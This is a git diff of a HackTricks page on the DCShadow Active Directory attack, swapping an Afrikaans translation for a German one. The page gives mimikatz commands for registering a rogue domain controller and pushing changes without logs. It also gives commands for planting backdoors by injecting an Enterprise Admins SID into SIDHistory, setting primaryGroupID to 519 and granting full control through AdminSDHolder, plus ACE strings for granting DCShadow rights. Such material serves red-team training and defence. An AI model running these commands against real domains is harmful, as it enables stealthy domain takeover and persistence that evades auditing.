@@ -1,14 +1,14 @@
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
@@ -16,12 +16,12 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 # DCShadow
 
-Dit registreer 'n **nuwe Domeinbeheerder** in die AD en gebruik dit om **atribute** (SIDHistory, SPNs...) op gespesifiseerde voorwerpe **te druk** **sonder** om enige **logs** oor die **wysigings** agter te laat. Jy **het DA** regte nodig en moet binne die **worteldomein** wees.\
-Let daarop dat as jy verkeerde data gebruik, sal daar baie lelike logs verskyn.
+Es registriert einen **neuen Domänencontroller** im AD und verwendet ihn, um **Attribute** (SIDHistory, SPNs...) an bestimmten Objekten **ohne** das Hinterlassen von **Protokollen** bezüglich der **Änderungen** zu **pushen**. Du **brauchst DA**-Berechtigungen und musst im **Root-Domain** sein.\
+Beachte, dass bei Verwendung falscher Daten ziemlich hässliche Protokolle erscheinen werden.
 
-Om die aanval uit te voer, het jy 2 mimikatz instansies nodig. Een van hulle sal die RPC bedieners met SYSTEM regte begin (jy moet hier die veranderinge aandui wat jy wil maak), en die ander instansie sal gebruik word om die waardes te druk:
+Um den Angriff durchzuführen, benötigst du 2 Mimikatz-Instanzen. Eine davon startet die RPC-Server mit SYSTEM-Berechtigungen (hier musst du die Änderungen angeben, die du durchführen möchtest), und die andere Instanz wird verwendet, um die Werte zu pushen:
 
-{% code title="mimikatz1 (RPC servers)" %}
+{% code title="mimikatz1 (RPC-Server)" %}
 ```bash
 !+
 !processtoken
@@ -29,46 +29,46 @@ lsadump::dcshadow /object:username /attribute:Description /value="My new descrip
 ```
 {% endcode %}
 
-{% code title="mimikatz2 (push) - Vereis DA of soortgelyk" %}
+{% code title="mimikatz2 (push) - Benötigt DA oder ähnliches" %}
 ```bash
 lsadump::dcshadow /push
 ```
 {% endcode %}
 
-Let op dat **`elevate::token`** nie in `mimikatz1` sessie sal werk nie, aangesien dit die voorregte van die draad verhoog het, maar ons moet die **voorreg van die proses** verhoog.\
-Jy kan ook 'n "LDAP" objek kies: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
+Beachten Sie, dass **`elevate::token`** in der `mimikatz1`-Sitzung nicht funktioniert, da dies die Berechtigungen des Threads erhöht, wir jedoch die **Berechtigung des Prozesses** erhöhen müssen.\
+Sie können auch ein "LDAP"-Objekt auswählen: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
 
-Jy kan die veranderinge vanaf 'n DA of vanaf 'n gebruiker met hierdie minimale toestemmings druk:
+Sie können die Änderungen von einem DA oder von einem Benutzer mit diesen minimalen Berechtigungen vornehmen:
 
-* In die **domein objek**:
-* _DS-Install-Replica_ (Voeg/Verwyder Replica in Domein)
-* _DS-Replication-Manage-Topology_ (Bestuur Replika Topologie)
-* _DS-Replication-Synchronize_ (Replika Sinchronisasie)
-* Die **Sites objek** (en sy kinders) in die **Konfigurasie houer**:
-* _CreateChild en DeleteChild_
-* Die objek van die **rekenaar wat geregistreer is as 'n DC**:
-* _WriteProperty_ (Nie Skryf nie)
-* Die **teiken objek**:
-* _WriteProperty_ (Nie Skryf nie)
+* Im **Domänenobjekt**:
+* _DS-Install-Replica_ (Replica in der Domäne hinzufügen/entfernen)
+* _DS-Replication-Manage-Topology_ (Replikations-Topologie verwalten)
+* _DS-Replication-Synchronize_ (Replikationssynchronisation)
+* Das **Standorte-Objekt** (und seine Kinder) im **Konfigurationscontainer**:
+* _CreateChild und DeleteChild_
+* Das Objekt des **Computers, der als DC registriert ist**:
+* _WriteProperty_ (Nicht Schreiben)
+* Das **Zielobjekt**:
+* _WriteProperty_ (Nicht Schreiben)
 
-Jy kan [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) gebruik om hierdie voorregte aan 'n onvoorregte gebruiker te gee (let op dat dit 'n paar logs sal agterlaat). Dit is baie meer beperkend as om DA voorregte te hê.\
-Byvoorbeeld: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Dit beteken dat die gebruikersnaam _**student1**_ wanneer hy aan die masjien _**mcorp-student1**_ ingelog is, DCShadow toestemmings oor die objek _**root1user**_ het.
+Sie können [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) verwenden, um diese Berechtigungen einem unprivilegierten Benutzer zu geben (beachten Sie, dass dies einige Protokolle hinterlässt). Dies ist viel restriktiver als DA-Berechtigungen zu haben.\
+Zum Beispiel: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Das bedeutet, dass der Benutzername _**student1**_ beim Anmelden an der Maschine _**mcorp-student1**_ DCShadow-Berechtigungen über das Objekt _**root1user**_ hat.
 
-## Gebruik DCShadow om agterdeure te skep
+## Verwendung von DCShadow zur Erstellung von Hintertüren
 
-{% code title="Stel Enterprise Admins in SIDHistory na 'n gebruiker" %}
+{% code title="Setzen von Enterprise Admins in SIDHistory auf einen Benutzer" %}
 ```bash
 lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
 ```
 {% endcode %}
 
-{% code title="Verander PrimaryGroupID (sit gebruiker as lid van Domein Administrators)" %}
+{% code title="Ändere PrimaryGroupID (füge Benutzer der Gruppe Domain Administrators hinzu)" %}
 ```bash
 lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 ```
 {% endcode %}
 
-{% code title="Wysig ntSecurityDescriptor van AdminSDHolder (gee Volle Beheer aan 'n gebruiker)" %}
+{% code title="Ändern des ntSecurityDescriptor von AdminSDHolder (Vollzugriff für einen Benutzer gewähren)" %}
 ```bash
 #First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
 (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
@@ -77,35 +77,35 @@ lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attr
 ```
 {% endcode %}
 
-## Shadowception - Gee DCShadow toestemmings met behulp van DCShadow (geen gewysigde toestemmingslogs)
+## Shadowception - Geben Sie DCShadow Berechtigungen mit DCShadow (keine modifizierten Berechtigungsprotokolle)
 
-Ons moet die volgende ACE's met ons gebruiker se SID aan die einde byvoeg:
+Wir müssen die folgenden ACEs mit der SID unseres Benutzers am Ende anhängen:
 
-* Op die domein objek:
+* Am Domänenobjekt:
 * `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
 * `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
 * `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-* Op die aanvaller rekenaar objek: `(A;;WP;;;UserSID)`
-* Op die teiken gebruiker objek: `(A;;WP;;;UserSID)`
-* Op die Sites objek in Konfigurasie houer: `(A;CI;CCDC;;;UserSID)`
+* Am Angreifer-Computerobjekt: `(A;;WP;;;UserSID)`
+* Am Zielbenutzerobjekt: `(A;;WP;;;UserSID)`
+* Am Sites-Objekt im Konfigurationscontainer: `(A;CI;CCDC;;;UserSID)`
 
-Om die huidige ACE van 'n objek te kry: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
+Um den aktuellen ACE eines Objekts zu erhalten: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`
 
-Let daarop dat jy in hierdie geval **verskeie veranderinge** moet maak, nie net een nie. So, in die **mimikatz1 sessie** (RPC bediener) gebruik die parameter **`/stack` met elke verandering** wat jy wil maak. Op hierdie manier, sal jy net een keer **`/push`** hoef te doen om al die gestopte veranderinge in die rogue bediener uit te voer.
+Beachten Sie, dass Sie in diesem Fall **mehrere Änderungen** vornehmen müssen, nicht nur eine. Verwenden Sie also im **mimikatz1-Sitzung** (RPC-Server) den Parameter **`/stack` mit jeder Änderung**, die Sie vornehmen möchten. Auf diese Weise müssen Sie nur einmal **`/push`** verwenden, um alle gestauten Änderungen auf dem Rouge-Server durchzuführen.
 
-[**Meer inligting oor DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+[**Weitere Informationen zu DCShadow auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
